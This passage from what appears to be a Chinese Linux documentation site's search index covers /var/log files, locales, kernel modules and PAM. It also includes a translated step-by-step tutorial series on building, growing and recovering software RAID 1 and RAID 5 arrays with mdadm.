buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。 /var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等。 /var/log/boot.log 包含系统启动时的日志。 /var/log/daemon.log 包含各种系统后台守护进程日志信息。 /var/log/dpkg.log 包括安装或dpkg命令清除软件包的日志。 /var/log/kern.log 包含内核产生的日志，有助于在定制内核时解决问题。 /var/log/lastlog 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。 /var/log/maillog /var/log/mail.log 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。 /var/log/user.log 记录所有等级用户信息的日志。 /var/log/Xorg.x.log 来自X的日志信息。 /var/log/alternatives.log 更新替代信息都记录在这个文件中。 /var/log/btmp 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，\"last -f /var/log/btmp | more\"。 /var/log/cups 涉及所有打印信息的日志。 /var/log/anaconda.log 在安装Linux时，所有安装信息都储存在这个文件中。 /var/log/yum.log 包含使用yum安装的软件包信息。 /var/log/cron 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。 /var/log/secure 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。 /var/log/wtmp或/var/log/utmp 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。 /var/log/faillog 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。 除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录： /var/log/httpd/或/var/log/apache2 包含服务器access_log和error_log信息。 /var/log/lighttpd/ 包含light HTTPD的access_log和error_log。 /var/log/mail/ 这个子目录包含邮件服务器的额外日志。 /var/log/prelink/ 包含.so文件被prelink修改的信息。 /var/log/audit/ 包含被 Linux audit daemon储存的信息。 /var/log/samba/ 包含由samba存储的信息。 /var/log/sa/ 包含每日由sysstat软件包收集的sar文件。 /var/log/sssd/ 用于守护进程安全服务。 除了手动存档和清除这些日志文件以外，还可以使用logrotate在文件达到一定大小后自动删除。\n可以尝试用vi，tail，grep和less等命令查看这些日志文件。","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-Auditd.html","loc":"/yq-docs-operating-system-linux-system-service-Auditd.html"},{"title":"国际化和本地化","text":"程序支持国际化的行为，是通过配置环境变量 $LANG 来支持本地化。\n语言环境的实际支持，依赖 libc 库提供的特性，\n并要求安装 locales 或 locales-all 软件包。 locales 软件包需要被适当的初始化。","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-Internationalization-and-localization.html","loc":"/yq-docs-operating-system-linux-system-service-Internationalization-and-localization.html"},{"title":"内核模块","text":"insmod 与 modprobe 都是载入 kernel module，\n不过一般差别于 modprobe 能够处理 module 载入的相依问题。 比方你要载入 a module，但是 a module 要求系统先载入 b module 时，\n直接用 insmod 挂入通常都会出现错误讯息，\n不过 modprobe 倒是能够知道先载入 b module 后才载入 a module，如此相依性就会满足。 不过 modprobe 并不是大神，不会厉害到知道 module 之间的相依性为何，\n该程式是读取 /lib/modules/2.6.xx/modules.dep 档案得知相依性的。\n而该档案是透过 depmod 程式所建立。 相关指令 lsmod rmmod insmod modprobe","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-Kernel-module.html","loc":"/yq-docs-operating-system-linux-system-service-Kernel-module.html"},{"title":"PAM模块","text":"PAM（Pluggable Authentication Modules， 嵌入式模块） 一套应用程序编程接口，提供一连串的验证机制，使用者将需求告知，PAM返回使用者验证的结果 配置文件都在 /etc/pam.d 下面 如, passwd执行流程 用户执行 passwd，输入密码、 passwd 呼叫 PAM验证模块 PAM 模块会找到 /etc/pam.d/ 找寻与程序（passwd） 同名的配置文件 依据 /etc/pam.d/passwd 内的设定，引用相关的PAM模块进行验证分析 将验证结果回传给passwd passwd根据返回结果决定下一个动作（验证失败或者通过） 配置文件结构: # /etc/pam.d/passwd\n#%PAM-1.0\n\nauth    include        system-auth 每一行可以区分为三个字段 type 主要分四种 auth authentication的缩写，检验使用者的身份验证，通常是需要密码检验的，所以后续接的模块是用来检验用户的身份。 account 大部分是在进行授权（authorization），检验使用者是否具有正确的权限，比如，使用一个过期的密码无法登陆 session 管理登陆期间（会话）环境 password 密码修改，变更 flag 验证通过的标准 required 此验证若成功则带有success标记，\n若失败带有failure标记\n不论是否成功都会进行后续流程（有利于log） requisite 如果是failure立刻返回给源程序失败，不会进行后续流程 sufficient 与上一个相反,\n成功则立刻返回,\n失败则继续后续步骤 optional 用于显示循讯息 PAM 模块与参数 待补充: | type | control flag | PAM模块与模块参数 |\n| ---- | ------------ | ---------- |\n|      |              |            |\n|      |              |            |\n|      |              |            | Linux重置root(user) ssh重置root(user)登陆失败计数器: pam_tally2 --user=root --reset    # 重置登陆计数器\npasswd root    # 重置密码","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-PAM-module.html","loc":"/yq-docs-operating-system-linux-system-service-PAM-module.html"},{"title":"用两块磁盘创建 RAID 1 (镜像)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6093&idtype=aid RAID 镜像 意味着相同数据的完整克隆（或镜像），分别写入到两个磁盘中。\n创建 RAID 1 至少需要两个磁盘，而且仅用于读取性能或者可靠性要比数据存储容量更重要的场合。 创建镜像是为了防止因硬盘故障导致数据丢失。\n镜像中的每个磁盘包含数据的完整副本。\n当一个磁盘发生故障时，相同的数据可以从其它正常磁盘中读取。\n而后，可以从正在运行的计算机中直接更换发生故障的磁盘，无需任何中断。 RAID 1 的特点 镜像具有良好的性能。 磁盘利用率为50％。也就是说，如果我们有两个磁盘每个500GB，总共是1TB，但在镜像中它只会显示500GB。 在镜像如果一个磁盘发生故障不会有数据丢失，因为两个磁盘中的内容相同。 读取性能会比写入性能更好。 要求 创建 RAID 1 至少要有两个磁盘，你也可以添加更多的磁盘，磁盘数需为2，4，6，8等偶数。\n要添加更多的磁盘，你的系统必须有 RAID 物理适配器（硬件卡）。 这里，我们使用软件 RAID 不是硬件 RAID，如果你的系统有一个内置的物理硬件 RAID 卡，\n你可以从它的功能界面或使用 Ctrl + I 键来访问它。 RAID 的级别和概念 原文: < https://linux.cn/article-6085-1.html >`_ 本地: RAID 的级别和概念 服务器配置: - 操作系统  :  CentOS 6.5 FinalIP\n- 地址      :  192.168.0.226\n- 主机名    :  rd1.tecmintlocal.com\n- 磁盘 1 [20GB]  :  /dev/sdb\n- 磁盘 2 [20GB]  :  /dev/sdc 本文将指导你在 Linux 平台上使用 mdadm （用于创建和管理 RAID ）一步步的建立一个软件 RAID 1 （镜像）。\n同样的做法也适用于如 RedHat，CentOS，Fedora 等 Linux 发行版。 第1步：安装所需软件并且检查磁盘 正如我前面所说，在 Linux 中我们需要使用 mdadm 软件来创建和管理 RAID。\n所以，让我们用 yum 或 apt-get 的软件包管理工具在 Linux 上安装 mdadm 软件包: yum install mdadm     [在 RedHat 系统]### apt-get install mdadm     [在 Debain 系统] 一旦安装好 mdadm 包，我们需要使用下面的命令来检查磁盘是否已经配置好: mdadm -E /dev/sd[b-c] 第2步：为 RAID 创建分区 正如我提到的，我们使用最少的两个分区 /dev/sdb 和 /dev/sdc 来创建 RAID 1。\n我们首先使用 fdisk 命令来创建这两个分区并更改其类型为 raid: fdisk /dev/sdb 按照下面的说明 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 按两次回车键默认将整个容量分配给它。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 修改分区类型。 键入 fd 设置为 Linux 的 RAID 类型，然后按 Enter 确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 在创建\"/dev/sdb\"分区后，接下来按照同样的方法创建分区 /dev/sdc: fdisk /dev/sdc 一旦这两个分区创建成功后，使用相同的命令来检查 sdb 和 sdc 分区并确认 RAID 分区的类型如上图所示: mdadm -E /dev/sd[b-c] 注解 正如你在上图所看到的，在 sdb1 和 sdc1 中没有任何对 RAID 的定义，这就是我们没有检测到超级块的原因。 第3步：创建 RAID 1 设备 接下来使用以下命令来创建一个名为 /dev/md0 的\"RAID 1\"设备并验证它: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[b-c]1### cat /proc/mdstat 接下来使用如下命令来检查 RAID 设备类型和 RAID 阵列: mdadm -E /dev/sd[b-c]1### mdadm --detail /dev/md0 检查 RAID 设备阵列 从上图中，人们很容易理解，RAID 1 已经创建好了，\n使用了 /dev/sdb1 和 /dev/sdc1 分区，你也可以看到状态为 resyncing（重新同步中）。 第4步：在 RAID 设备上创建文件系统 给 md0 上创建 ext4 文件系统: mkfs.ext4 /dev/md0 创建 RAID 设备文件系统 接下来，挂载新创建的文件系统到\"/mnt/raid1\"，并创建一些文件，验证在挂载点的数据: mkdir /mnt/raid1\nmount /dev/md0 /mnt/raid1/\ntouch /mnt/raid1/tecmint.txt\necho \"tecmint raid setups\" > /mnt/raid1/tecmint.txt 挂载 RAID 设备 为了在系统重新启动自动挂载 RAID 1，需要在 fstab 文件中添加条目。\n打开 /etc/fstab 文件并添加以下行: /dev/md0                /mnt/raid1              ext4    defaults        0 0 自动挂载 Raid 设备 运行 mount -av ，检查 fstab 中的条目是否有错误: mount -av 检查 fstab 中的错误 接下来，使用下面的命令保存 RAID 的配置到文件\"mdadm.conf\"中: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 Raid 的配置 上述配置文件在系统重启时会读取并加载 RAID 设备。 第5步：在磁盘故障后检查数据 我们的主要目的是，即使在任何磁盘故障或死机时必须保证数据是可用的。\n让我们来看看，当任何一个磁盘不可用时会发生什么: mdadm --detail /dev/md0 验证 RAID 设备 在上面的图片中，我们可以看到在 RAID 中有2个设备是可用的，\n并且 Active Devices 是2。\n现在让我们看看，当一个磁盘拔出（移除 sdc 磁盘）或损坏后会发生什么: ls -l /dev | grep sd### mdadm --detail /dev/md0 测试 RAID 设备 现在，在上面的图片中你可以看到，一个磁盘不见了。\n我从虚拟机上删除了一个磁盘。此时让我们来检查我们宝贵的数据: cd /mnt/raid1/### cat tecmint.txt 验证 RAID 数据 你可以看到我们的数据仍然可用。\n由此，我们可以了解 RAID 1（镜像）的优势。\n在接下来的文章中，我们将看到如何设置一个 RAID 5 条带化分布式奇偶校验。\n希望这可以帮助你了解 RAID 1（镜像）是如何工作的。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html"},{"title":"创建 RAID 5 (条带化与分布式奇偶校验)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 在 RAID 5 中，数据条带化后存储在分布式奇偶校验的多个磁盘上。\n分布式奇偶校验的条带化意味着它将奇偶校验信息和条带化数据分布在多个磁盘上，这样会有很好的数据冗余。 在 Linux 中配置 RAID 5 对于此 RAID 级别它至少应该有三个或更多个磁盘。\nRAID 5 通常被用于大规模生产环境中，以花费更多的成本来提供更好的数据冗余性能。 什么是奇偶校验 奇偶校验是在数据存储中检测错误最简单的常见方式。\n奇偶校验信息存储在每个磁盘中，比如说，我们有4个磁盘，其中相当于一个磁盘大小的空间被分割去存储所有磁盘的奇偶校验信息。\n如果任何一个磁盘出现故障，我们可以通过更换故障磁盘后，从奇偶校验信息重建得到原来的数据。 RAID 5 的优点和缺点 提供更好的性能。 支持冗余和容错。 支持热备份。 将用掉一个磁盘的容量存储奇偶校验信息。 单个磁盘发生故障后不会丢失数据。我们可以更换故障硬盘后从奇偶校验信息中重建数据。 适合于面向事务处理的环境，读操作会更快。 由于奇偶校验占用资源，写操作会慢一些。 重建需要很长的时间。 要求 创建 RAID 5 最少需要3个磁盘，你也可以添加更多的磁盘，\n前提是你要有多端口的专用硬件 RAID 控制器。在这里，我们使用\"mdadm\"包来创建软件 RAID。 mdadm 是一个允许我们在 Linux 下配置和管理 RAID 设备的包。\n默认情况下没有 RAID 的配置文件，我们在创建和配置 RAID 后必须将配置文件保存在一个单独的文件 mdadm.conf 中。 在进一步学习之前，我建议你通过下面的文章去了解 Linux 中 RAID 的基础知识 原文: 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 用两块磁盘创建 RAID 1（镜像） 我的服务器设置: 操作系统  :  CentOS 6.5 FinalIP\n地址      :    192.168.0.227\n主机名    :  rd5.tecmintlocal.com\n磁盘 1 [20GB]  :  /dev/sdb\n磁盘 2 [20GB]  :  /dev/sdc\n磁盘 3 [20GB]  :  /dev/sdd 这是9篇系列教程的第4部分，\n在这里我们要在 Linux 系统或服务器上使用三个20GB（名为/dev/sdb, /dev/sdc 和 /dev/sdd）\n的磁盘建立带有分布式奇偶校验的软件 RAID 5。 第1步：安装 mdadm 并检验磁盘 使用 CentOS 6.5 Final 版本来创建 RAID 设置，但同样的做法也适用于其他 Linux 发行版: lsb_release -a\nifconfig | grep inet CentOS 6.5 摘要 如果你按照我们的 RAID 系列去配置的，我们假设你已经安装了\"mdadm\"包，如果没有，根据你的 Linux 发行版使用下面的命令安装: yum install mdadm         # [在 RedHat 系统]\napt-get install mdadm     # [在 Debain 系统] \"mdadm\"包安装后，先使用`fdisk`命令列出我们在系统上增加的三个20GB的硬盘: fdisk -l | grep sd 安装 mdadm 工具 现在该检查这三个磁盘是否存在 RAID 块，使用下面的命令来检查: mdadm -E /dev/sd[b-d]\nmdadm --examine /dev/sdb /dev/sdc /dev/sdd  # 或 检查 Raid 磁盘 注解 上面的图片说明，没有检测到任何超级块。\n所以，这三个磁盘中没有定义 RAID。让我们现在开始创建一个吧！ 第2步：为磁盘创建 RAID 分区 首先，在创建 RAID 前磁盘（/dev/sdb, /dev/sdc 和 /dev/sdd）必须有分区，\n因此，在进行下一步之前，先使用 fdisk 命令进行分区: fdisk /dev/sdb\nfdisk /dev/sdc\nfdisk /dev/sdd 创建 /dev/sdb 分区, 请按照下面的说明在 /dev/sdb 硬盘上创建分区。 按 n 创建新的分区。 然后按 P 选择主分区。选择主分区是因为还没有定义过分区。 接下来选择分区号为1。默认就是1。 这里是选择柱面大小，我们没必要选择指定的大小，因为我们需要为 RAID 使用整个分区，所以只需按两次 Enter 键默认将整个容量分配给它。 然后，按 P 来打印创建好的分区。 改变分区类型，按 L 可以列出所有可用的类型。 按 t 修改分区类型。 这里使用 fd 设置为 RAID 的类型。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 创建 sdb 分区 注解 我们仍要按照上面的步骤来创建 sdc 和 sdd 的分区。 创建 /dev/sdc 分区,\n现在，通过下面的截图给出创建 sdc 和 sdd 磁盘分区的方法，或者你可以按照上面的步骤: fdisk /dev/sdc 创建 sdc 分区 创建 /dev/sdd 分区: fdisk /dev/sdd 创建 sdd 分区 创建分区后，检查三个磁盘 sdb, sdc, sdd 的变化: mdadm --examine /dev/sdb /dev/sdc /dev/sdd\nmdadm -E /dev/sd[b-c] 检查磁盘变化 注解 在上面的图片中，磁盘的类型是 fd。 现在在新创建的分区检查 RAID 块。如果没有检测到超级块，我们就能够继续下一步，在这些磁盘中创建一个新的 RAID 5 配置。 在分区中检查 RAID 第3步：创建 md 设备 md0 现在使用所有新创建的分区(sdb1, sdc1 和 sdd1)\n创建一个 RAID 设备\"md0\"（即 /dev/md0），使用以下命令: mdadm --create /dev/md0 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1\n### mdadm -C /dev/md0 -l=5 -n=3 /dev/sd[b-d]1   ### 或 创建 RAID 设备后，检查并确认 RAID，从 mdstat 中输出中可以看到包括的设备的 RAID 级别: cat /proc/mdstat 验证 Raid 设备 如果你想监视当前的创建过程，你可以使用 watch 命令，\n将 cat /proc/mdstat 传递给它，它会在屏幕上显示且每隔1秒刷新一次: watch -n1 cat /proc/mdstat 监控 RAID 5 构建过程 Raid 5 过程概要 创建 RAID 后，使用以下命令验证 RAID 设备: mdadm -E /dev/sd[b-d]1 验证 Raid 级别 注解 因为它显示三个磁盘的信息，上述命令的输出会有点长。 接下来，验证 RAID 阵列，假定包含 RAID 的设备正在运行并已经开始了重新同步: mdadm --detail /dev/md0 验证 RAID 阵列 第4步：为 md0 创建文件系统 在挂载前为\"md0\"设备创建 ext4 文件系统: mkfs.ext4 /dev/md0 创建 md0 文件系统 现在，在 /mnt 下创建目录 raid5，\n然后挂载文件系统到 /mnt/raid5/ 下，并检查挂载点下的文件，你会看到 lost+found 目录: mkdir /mnt/raid5\nmount /dev/md0 /mnt/raid5/\nls -l /mnt/raid5/ 在挂载点 /mnt/raid5 下创建几个文件，并在其中一个文件中添加一些内容然后去验证: touch /mnt/raid5/raid5_tecmint_{1..5}\nls -l /mnt/raid5/\necho \"tecmint raid setups\" > /mnt/raid5/raid5_tecmint_1\ncat /mnt/raid5/raid5_tecmint_1\ncat /proc/mdstat 挂载 RAID 设备 我们需要在 fstab 中添加条目，否则系统重启后将不会显示我们的挂载点。\n编辑 fstab 文件添加条目，在文件尾追加以下行。挂载点会根据你环境的不同而不同: vim /etc/fstab/dev/md0                /mnt/raid5              ext4    defaults        0 0 自动挂载 RAID 5 接下来，运行 mount -av 命令检查 fstab 条目中是否有错误: mount -av 检查 Fstab 错误 第5步：保存 Raid 5 的配置 在前面章节已经说过，默认情况下 RAID 没有配置文件。\n我们必须手动保存。如果此步中没有跟随不属于 md0 的 RAID 设备，它会是一些其他随机数字。 所以，我们必须要在系统重新启动之前保存配置。\n如果配置保存它在系统重新启动时会被加载到内核中然后 RAID 也将被加载: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 RAID 5 配置 注意：保存配置将保持 md0 设备的 RAID 级别稳定不变。 第6步：添加备用磁盘 备用磁盘有什么用？它是非常有用的，如果我们有一个备用磁盘，\n当我们阵列中的任何一个磁盘发生故障后，这个备用磁盘会进入激活重建过程，并从其他磁盘上同步数据，这样就有了冗余。 更多关于添加备用磁盘和检查 RAID 5 容错的指令，请阅读下面文章中的第6步和第7步。 在 RAID 5 中添加备用磁盘","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html"},{"title":"在 RAID 中扩展现有的 RAID 阵列和删除故障的磁盘","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling 评论: https://linux.cn/portal.php?mod=comment&id=6123&idtype=aid 每个新手都会对阵列（array）这个词所代表的意思产生疑惑。\n阵列只是磁盘的一个集合。\n换句话说，我们可以称阵列为一个集合（set）或一组（group）。\n就像一组鸡蛋中包含6个一样。同样 RAID 阵列中包含着多个磁盘，\n可能是2，4，6，8，12，16等，希望你现在知道了什么是阵列。 在这里，我们将看到如何扩展现有的阵列或 RAID 组。\n例如，如果我们在阵列中使用2个磁盘形成一个 raid 1 集合，\n在某些情况，如果该组中需要更多的空间，就可以使用 mdadm -grow 命令来扩展阵列大小，\n只需要将一个磁盘加入到现有的阵列中即可。\n在说完扩展（添加磁盘到现有的阵列中）后，我们将看看如何从阵列中删除故障的磁盘。 扩展 RAID 阵列和删除故障的磁盘 假设磁盘中的一个有问题了需要删除该磁盘，但我们需要在删除磁盘前添加一个备用磁盘来扩展该镜像，\n因为我们需要保存我们的数据。当磁盘发生故障时我们需要从阵列中删除它，这是这个主题中我们将要学习到的。 扩展 RAID 的特性 我们可以增加（扩展）任意 RAID 集合的大小。 我们可以在使用新磁盘扩展 RAID 阵列后删除故障的磁盘。 我们可以扩展 RAID 阵列而无需停机。 要求 为了扩展一个RAID阵列，我们需要一个已有的 RAID 组（阵列）。 我们需要额外的磁盘来扩展阵列。 在这里，我们使用一块磁盘来扩展现有的阵列。 在我们了解扩展和恢复阵列前，我们必须了解有关 RAID 级别和设置的基本知识。点击下面的链接了解这些。 原文 介绍 RAID 的级别和概念 使用 mdadm 工具创建软件 RAID 0 （条带化） 服务器设置: 操作系统    :   CentOS 6.5 Final\nIP地址      :   192.168.0.230\n主机名      :   grow.tecmintlocal.com\n2 块现有磁盘   :   1 GB\n1 块额外磁盘   :   1 GB 在这里，我们已有一个 RAID ，有2块磁盘，每个大小为1GB，\n我们现在再增加一个磁盘到我们现有的 RAID 阵列中，其大小为1GB。 扩展现有的 RAID 阵列 在扩展阵列前，首先使用下面的命令列出现有的 RAID 阵列: mdadm --detail /dev/md0 检查现有的 RAID 阵列 注解 以上输出显示，已经有了两个磁盘在 RAID 阵列中，级别为 RAID 1。现在我们增加一个磁盘到现有的阵列里。 现在让我们添加新的磁盘\"sdd\"，并使用 fdisk 命令来创建分区: fdisk /dev/sdd 请使用以下步骤为 /dev/sdd 创建一个新的分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按回车确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 为 sdd 创建新的分区 一旦新的 sdd 分区创建完成后，你可以使用下面的命令验证它: ls -l /dev/ | grep sd 确认 sdd 分区 接下来，在添加到阵列前先检查磁盘是否有 RAID 分区: mdadm --examine /dev/sdd1 在 sdd 分区中检查 RAID 注解 以上输出显示，该盘有没有发现 super-blocks，意味着我们可以将新的磁盘添加到现有阵列。 要添加新的分区 /dev/sdd1 到现有的阵列 md0，请使用以下命令: mdadm --manage /dev/md0 --add /dev/sdd1 添加磁盘到 RAID 阵列 一旦新的磁盘被添加后，在我们的阵列中检查新添加的磁盘: mdadm --detail /dev/md0 确认将新磁盘添加到 RAID 中 注解 在上面的输出，你可以看到磁盘已经被添加作为备用的。在这里，我们的阵列中已经有了2个磁盘，但我们期待阵列中有3个磁盘，因此我们需要扩展阵列。 要扩展阵列，我们需要使用下面的命令: mdadm --grow --raid-devices=3 /dev/md0 扩展 Raid 阵列 现在我们可以看到第三块磁盘(sdd1)已被添加到阵列中，在第三块磁盘被添加后，它将从另外两块磁盘上同步数据: mdadm --detail /dev/md0 确认 Raid 阵列 注解 对于大容量磁盘会需要几个小时来同步数据。在这里，我们使用的是1GB的虚拟磁盘，所以它非常快在几秒钟内便会完成。 从阵列中删除磁盘 在数据被从其他两个磁盘同步到新磁盘 sdd1 后，现在三个磁盘中的数据已经相同了（镜像）。 正如我前面所说的，假定一个磁盘出问题了需要被删除。所以，现在假设磁盘 sdc1 出问题了，需要从现有阵列中删除。 在删除磁盘前我们要将其标记为失效，然后我们才可以将其删除: mdadm --fail /dev/md0 /dev/sdc1### mdadm --detail /dev/md0 在 RAID 阵列中模拟磁盘故障* 从上面的输出中，我们清楚地看到，磁盘在下面被标记为 faulty。\n即使它是 faulty 的，我们仍然可以看到 raid 设备有3个，1个损坏了，状态是 degraded。 现在我们要从阵列中删除 faulty 的磁盘，raid 设备将像之前一样继续有2个设备: mdadm --remove /dev/md0 /dev/sdc1 在 Raid 阵列中删除磁盘 一旦故障的磁盘被删除，然后我们只能使用2个磁盘来扩展 raid 阵列了: mdadm --grow --raid-devices=2 /dev/md0### mdadm --detail /dev/md0 在 RAID 阵列扩展磁盘 从上面的输出中可以看到，我们的阵列中仅有2台设备。\n如果你需要再次扩展阵列，按照如上所述的同样步骤进行。\n如果你需要添加一个磁盘作为备用，将其标记为 spare，因此，如果磁盘出现故障时，它会自动顶上去并重建数据。 结论 在这篇文章中，我们已经看到了如何扩展现有的 RAID 集合，以及如何在重新同步已有磁盘的数据后从一个阵列中删除故障磁盘。\n所有这些步骤都可以不用停机来完成。在数据同步期间，系统用户，文件和应用程序不会受到任何影响。 在接下来的文章我将告诉你如何管理 RAID，敬请关注更新，不要忘了写评论。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html","loc":"/yq-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html"},{"title":"当软件 RAID 故障时如何恢复和重建数据","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6448&idtype=aid >`_ 在阅读过 RAID 系列 前面的文章后你已经对 RAID 比较熟悉了。\n回顾前面几个软件 RAID 的配置，我们对每一个都做了详细的解释，使用哪一个取决与你的具体情况。 在本文中，我们将讨论当一个磁盘发生故障时如何重建软件 RAID 阵列并且不会丢失数据。\n为方便起见，我们仅考虑RAID 1 的配置 - 但其方法和概念适用于所有情况。 RAID 测试方案 在进一步讨论之前，请确保你已经配置好了 RAID 1 阵列，\n可以按照本系列第3部分提供的方法: 在 Linux 中如何创建 RAID 1（镜像） 在目前的情况下，仅有的变化是： 使用不同版本 CentOS（v7），而不是前面文章中的（v6.5）。 磁盘容量发生改变， /dev/sdb 和 /dev/sdc（各8GB）。 此外，如果 SELinux 设置为 enforcing 模式，你需要将相应的标签添加到挂载 RAID 设备的目录中。\n否则，当你试图挂载时，你会碰到这样的警告信息： 启用 SELinux 时 RAID 挂载错误 通过以下命令来解决: restorecon -R /mnt/raid1 配置 RAID 监控 存储设备损坏的原因很多（尽管固态硬盘大大减少了这种情况发生的可能性），但不管是什么原因，\n可以肯定问题随时可能发生，你需要准备好替换发生故障的部分，并确保数据的可用性和完整性。 首先建议是。虽然你可以查看 /proc/mdstat 来检查 RAID 的状态，但有一个更好的和节省时间的方法，\n使用监控 + 扫描模式运行 mdadm，它将警报通过电子邮件发送到一个预定义的收件人。 要这样设置，在 /etc/mdadm.conf 添加以下行: MAILADDR user@<domain or localhost> 我自己的设置如下: MAILADDR gacanepa@localhost 监控 RAID 并使用电子邮件进行报警 要让 mdadm 运行在监控 + 扫描模式中，以 root 用户添加以下 crontab 条目: @reboot /sbin/mdadm --monitor --scan --oneshot 默认情况下，mdadm 每隔60秒会检查 RAID 阵列，如果发现问题将发出警报。\n你可以通过添加 --delay 选项到crontab 条目上面，后面跟上秒数，来修改默认行为（例如， --delay 1800意味着30分钟）。 最后，确保你已经安装了一个邮件用户代理（MUA），\n如 mutt 或 mailx .\n否则，你将不会收到任何警报。 在一分钟内，我们就会看到 mdadm 发送的警报。 模拟和更换发生故障的 RAID 存储设备 为了给 RAID 阵列中的存储设备模拟一个故障，我们将使用 --manage 和 --set-faulty 选项，如下所示: mdadm --manage --set-faulty /dev/md0 /dev/sdc1 这将导致 /dev/sdc1 被标记为 faulty，我们可以在 /proc/mdstat 看到： 在 RAID 存储设备上模拟问题 更重要的是，让我们看看是不是收到了同样的警报邮件: RAID 设备故障时发送邮件警报 在这种情况下，你需要从软件 RAID 阵列中删除该设备: mdadm /dev/md0 --remove /dev/sdc1 然后，你可以直接从机器中取出，并将其使用备用设备来取代（/dev/sdd 中类型为 fd 的分区是以前创建的）: mdadm --manage /dev/md0 --add /dev/sdd1 幸运的是，该系统会使用我们刚才添加的磁盘自动重建阵列。\n我们可以通过标记 /dev/sdb1 为 faulty 来进行测试，从阵列中取出后，并确认 tecmint.txt 文件仍然在 /mnt/raid1 是可访问的: mdadm --detail /dev/md0\nmount | grep raid1\nls -l /mnt/raid1 | grep tecmint\ncat /mnt/raid1/tecmint.txt 确认 RAID 重建 上面图片清楚的显示，添加 /dev/sdd1 到阵列中来替代 /dev/sdc1，数据的重建是系统自动完成的，不需要干预。 虽然要求不是很严格，有一个备用设备是个好主意，这样更换故障的设备就可以在瞬间完成了。\n要做到这一点，先让我们重新添加 /dev/sdb1 和 /dev/sdc1: mdadm --manage /dev/md0 --add /dev/sdb1\nmdadm --manage /dev/md0 --add /dev/sdc1 取代故障的 Raid 设备 从冗余丢失中恢复数据 如前所述，当一个磁盘发生故障时， mdadm 将自动重建数据。\n但是，如果阵列中的2个磁盘都故障时会发生什么？让我们来模拟这种情况，\n通过标记 /dev/sdb1 和 /dev/sdd1 为 faulty: umount /mnt/raid1\nmdadm --manage --set-faulty /dev/md0 /dev/sdb1\nmdadm --stop /dev/md0\nmdadm --manage --set-faulty /dev/md0 /dev/sdd1 此时尝试以同样的方式重新创建阵列就（或使用 --assume-clean 选项）可能会导致数据丢失，因此不到万不得已不要使用。 让我们试着从 /dev/sdb1 恢复数据，\n例如，在一个类似的磁盘分区（/dev/sde1 - 注意，这需要你执行前在/dev/sde 上创建一个 fd 类型的分区）上使用 ddrescue : ddrescue -r 2 /dev/sdb1 /dev/sde1 恢复 Raid 阵列 请注意，到现在为止，我们还没有触及 /dev/sdb 和 /dev/sdd，它们的分区是 RAID 阵列的一部分。 现在，让我们使用 /dev/sde1 和 /dev/sdf1 来重建阵列: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[e-f]1 请注意，在真实的情况下，你需要使用与原来的阵列中相同的设备名称，\n即设备失效后替换的磁盘的名称应该是 /dev/sdb1 和 /dev/sdc1。 在本文中，我选择了使用额外的设备来重新创建全新的磁盘阵列，是为了避免与原来的故障磁盘混淆。 当被问及是否继续写入阵列时，键入 Y，然后按 Enter。阵列被启动，你也可以查看它的进展: watch -n 1 cat /proc/mdstat 当这个过程完成后，你就应该能够访问 RAID 的数据： 确认 Raid 数据 总结 在本文中，我们回顾了从 RAID 故障和冗余丢失中恢复数据。\n但是，你要记住，这种技术是一种存储解决方案，不能取代备份。 本文中介绍的方法适用于所有 RAID 中，其中的概念我将在本系列的最后一篇（RAID 管理）中涵盖它。 